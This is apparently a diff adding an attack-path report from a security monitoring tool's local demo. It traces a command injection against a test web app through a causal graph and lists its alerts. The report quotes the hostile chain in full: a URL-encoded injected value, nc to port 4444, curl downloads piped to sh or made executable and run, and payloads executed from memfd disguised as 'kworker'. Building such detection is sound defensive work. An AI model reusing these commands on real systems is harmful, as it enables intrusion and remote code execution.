@@ -1,0 +1,105 @@
+attack path around proc 7352 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)
+  41 nodes shown of 210 reached: 0 files only read on the way (libraries, configuration) and 169 earlier influences off the cause chain left out
+  started under: sudo(7253) <- sudo(7251) <- bash(7239) <- bash(1338) <- sshd-session(1337) <- sshd-session(1232) <- sshd(1229) <- systemd(1)
+
+alerts on this path:
+    +0.001s  R4 net-shell    pid 7320 python (network input from 127.0.0.1:8080 <- 127.0.0.1:57084) started /bin/sh as pid 7352
+    +1.062s  R1 dropper      wrote /tmp/.k (pid 7355 curl), ran it as pid 7358
+    +1.112s  R1 dropper      wrote /memfd:kworker (deleted) (pid 7362 python3), ran it as pid 7363
+    +1.112s  R2 memfd-exec   pid 7363 ran /proc/self/fd/3 as kworker
+    +1.121s  R1 dropper      wrote /var/tmp/.upd-p15demo (pid 7362 python3), ran it as pid 7364
+    +1.121s  R3 deleted-exec pid 7364 ran /proc/self/fd/4 as upd
+
+why it happened: the most recent cause of each step, newest first:
+             proc 7352 sh
+    +0.000s    <-CLONE-- proc 7320 python
+    -0.001s    <-RECV-- sock 127.0.0.1:8080 -> 127.0.0.1:57084
+               <-TCP-- sock 127.0.0.1:57084 -> 127.0.0.1:8080
+    -0.001s    <-SEND-- proc 7351 curl
+    -0.012s    <-CLONE-- proc 7254 bash
+    -0.078s    <-READ-- file o:2222
+
+what it led to, in order (time from the start node's first moment):
+    +0.000s  proc 7320 python  --CLONE-->  proc 7352 sh
+    +0.001s  file /usr/bin/dash  --EXECUTE-->  proc 7352 sh
+    +0.004s  proc 7352 sh  --CLONE-->  proc 7353 getent
+    +0.006s  file /usr/bin/getent  --EXECUTE-->  proc 7353 getent
+    +0.010s  proc 7353 getent  --CONNECT-->  sock 127.0.0.1:40718 -> 127.0.0.53:53
+    +0.010s  proc 7353 getent  --SEND-->  sock 127.0.0.1:40718 -> 127.0.0.53:53  38 bytes
+    +0.010s  sock 127.0.0.1:40718 -> 127.0.0.53:53  --RECV-->  proc 7353 getent  66 bytes
+    +0.010s  proc 7353 getent  --WRITE-->  file o:2286  26 bytes
+    +0.010s  file o:2286  --READ-->  proc 7320 python  26 bytes
+    +0.011s  proc 7352 sh  --CLONE-->  proc 7354 nc
+    +0.011s  file /usr/bin/nc.openbsd  --EXECUTE-->  proc 7354 nc
+    +0.014s  proc 7354 nc  --CONNECT-->  sock 127.0.0.1:57868 -> 127.0.0.1:4444
+    +0.014s  sock 127.0.0.1:4444 -> 127.0.0.1:57868  --ACCEPT-->  proc 7316 nc
+    +1.029s  proc 7352 sh  --CLONE-->  proc 7355 curl
+    +1.030s  file /usr/bin/curl  --EXECUTE-->  proc 7355 curl
+    +1.036s  proc 7355 curl  --CONNECT-->  sock 127.0.0.1:46508 -> 127.0.0.1:8000
+    +1.037s  sock 127.0.0.1:8000 -> 127.0.0.1:46508  --ACCEPT-->  proc 7327 python
+    +1.038s  proc 7355 curl  --SEND-->  sock 127.0.0.1:46508 -> 127.0.0.1:8000  79 bytes
+    +1.038s  sock 127.0.0.1:8000 -> 127.0.0.1:46508  --RECV-->  proc 7327 python  79 bytes
+    +1.043s  proc 7327 python  --WRITE-->  file /var/tmp/p15-demo/stager.log  x2  123 bytes
+    +1.044s  proc 7327 python  --SEND-->  sock 127.0.0.1:8000 -> 127.0.0.1:46508  x47  11807310 bytes
+    +1.044s  sock 127.0.0.1:46508 -> 127.0.0.1:8000  --RECV-->  proc 7355 curl  x119  11807310 bytes
+    +1.044s  file /tmp/.k  --OPEN-->  proc 7355 curl
+    +1.044s  proc 7355 curl  --WRITE-->  file /tmp/.k  x1486  11807104 bytes
+    +1.056s  proc 7352 sh  --CLONE-->  proc 7357 chmod
+    +1.057s  file /usr/lib/cargo/bin/coreutils/tee  --EXECUTE-->  proc 7357 chmod
+    +1.061s  proc 7352 sh  --CLONE-->  proc 7358 .k
+    +1.062s  file /tmp/.k  --EXECUTE-->  proc 7358 .k
+    +1.066s  proc 7358 .k  --WRITE-->  file o:2377  x3  32 bytes
+    +1.066s  file o:2377  --READ-->  proc 7320 python  x11  249 bytes
+    +1.067s  proc 7352 sh  --CLONE-->  proc 7359 curl
+    +1.067s  proc 7352 sh  --CLONE-->  proc 7360 sh
+    +1.067s  file /usr/bin/curl  --EXECUTE-->  proc 7359 curl
+    +1.068s  file /usr/bin/dash  --EXECUTE-->  proc 7360 sh
+    +1.070s  file o:2429  --READ-->  proc 7360 sh  563 bytes
+    +1.074s  proc 7359 curl  --CONNECT-->  sock 127.0.0.1:46512 -> 127.0.0.1:8000
+    +1.074s  sock 127.0.0.1:8000 -> 127.0.0.1:46512  --ACCEPT-->  proc 7327 python
+    +1.074s  proc 7359 curl  --SEND-->  sock 127.0.0.1:46512 -> 127.0.0.1:8000  80 bytes
+    +1.074s  sock 127.0.0.1:8000 -> 127.0.0.1:46512  --RECV-->  proc 7327 python  80 bytes
+    +1.075s  proc 7327 python  --SEND-->  sock 127.0.0.1:8000 -> 127.0.0.1:46512  x2  764 bytes
+    +1.075s  sock 127.0.0.1:46512 -> 127.0.0.1:8000  --RECV-->  proc 7359 curl  764 bytes
+    +1.075s  proc 7359 curl  --WRITE-->  file o:2429  563 bytes
+    +1.076s  proc 7360 sh  --WRITE-->  file o:2432  477 bytes
+    +1.076s  proc 7360 sh  --CLONE-->  proc 7362 python3
+    +1.076s  file /usr/bin/python3.14  --EXECUTE-->  proc 7362 python3
+    +1.090s  file o:2432  --READ-->  proc 7362 python3  477 bytes
+    +1.100s  file /usr/lib/cargo/bin/coreutils/tee  --OPEN-->  proc 7362 python3  x2
+    +1.100s  file /usr/lib/cargo/bin/coreutils/tee  --READ-->  proc 7362 python3  11807104 bytes
+    +1.106s  proc 7362 python3  --WRITE-->  file /memfd:kworker (deleted)  11807104 bytes
+    +1.111s  proc 7362 python3  --CLONE-->  proc 7363 3 [kworker]
+    +1.112s  file /memfd:kworker (deleted)  --EXECUTE-->  proc 7363 3 [kworker]
+    +1.115s  proc 7363 3 [kworker]  --WRITE-->  file o:2377  x5  107 bytes
+    +1.116s  file /var/tmp/.upd-p15demo  --OPEN-->  proc 7362 python3  x2
+    +1.121s  proc 7362 python3  --CLONE-->  proc 7364 4 [upd]
+    +1.121s  file /var/tmp/.upd-p15demo  --EXECUTE-->  proc 7364 4 [upd]
+    +1.125s  proc 7364 4 [upd]  --WRITE-->  file o:2377  x5  110 bytes
+    +1.136s  proc 7320 python  --WRITE-->  file /var/tmp/p15-demo/webapp.log  265 bytes
+    +1.136s  proc 7320 python  --SEND-->  sock 127.0.0.1:8080 -> 127.0.0.1:57084  x2  144 bytes
+    +1.137s  sock 127.0.0.1:57084 -> 127.0.0.1:8080  --RECV-->  proc 7351 curl  144 bytes
+             sock 127.0.0.1:57084 -> 127.0.0.1:8080  ==TCP==  sock 127.0.0.1:8080 -> 127.0.0.1:57084  (one connection, joined by sequence number)
+             sock 127.0.0.1:46508 -> 127.0.0.1:8000  ==TCP==  sock 127.0.0.1:8000 -> 127.0.0.1:46508  (one connection, joined by sequence number)
+             sock 127.0.0.1:46512 -> 127.0.0.1:8000  ==TCP==  sock 127.0.0.1:8000 -> 127.0.0.1:46512  (one connection, joined by sequence number)
+             sock 127.0.0.1:57868 -> 127.0.0.1:4444  ==TCP==  sock 127.0.0.1:4444 -> 127.0.0.1:57868  (one connection, joined by sequence number)
+
+the processes, in full:
+  proc 7254 bash (bash tools/demo/run_demo.sh /var/tmp/p15-demo)
+  proc 7316 nc (nc -l 127.0.0.1 4444)
+  proc 7320 python (/home/ashu/p15venv/bin/python tools/demo/webapp.py 8080)
+  proc 7327 python (/home/ashu/p15venv/bin/python -m http.server 8000 --bind 127.0.0.1 --directory /var/tmp/p15-demo/stager)
+  proc 7351 curl (curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh)
+  proc 7352 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)
+  proc 7353 getent (getent hosts localhost)
+  proc 7354 nc (nc -w1 127.0.0.1 4444)
+  proc 7355 curl (curl -s http://127.0.0.1:8000/k -o /tmp/.k)
+  proc 7357 chmod (chmod +x /tmp/.k)
+  proc 7358 .k (/tmp/.k)
+  proc 7359 curl (curl -s http://127.0.0.1:8000/s2)
+  proc 7360 sh (sh)
+  proc 7362 python3 (python3 -)
+  proc 7363 3 (kworker)
+  proc 7364 4 (upd)
+
+HTML: /var/tmp/p15-demo/attack-path.html
